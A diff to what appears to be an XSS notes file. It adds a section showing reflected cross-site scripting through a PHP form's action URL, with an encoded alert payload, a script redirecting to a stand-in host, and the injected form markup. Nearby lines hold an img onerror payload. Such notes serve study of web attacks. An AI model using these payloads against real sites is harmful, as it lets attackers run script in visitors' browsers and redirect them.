@@ -126,6 +126,27 @@ The "sinks" manipulate the DOM, and then the DOM causes the JavaScript to execut
 `<img src='0' onerror=alert(1)>`
 
 
+
+
+## PHP
+
+### Form
+this url
+```
+http://www.example.com/test_form.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E
+
+#or
+
+http://www.example.com/test_form.php/<script>location.href('http://www.hacked.com')</script>
+```
+translated to:
+```
+<form method="post" action="test_form.php/"><script>alert('hacked')</script>
+```
+
+
+
+
 ### DOM XSS in jQuery anchor href attribute sink using `location.search`
 ```
 <a id="backLink" href="/">Back</a>
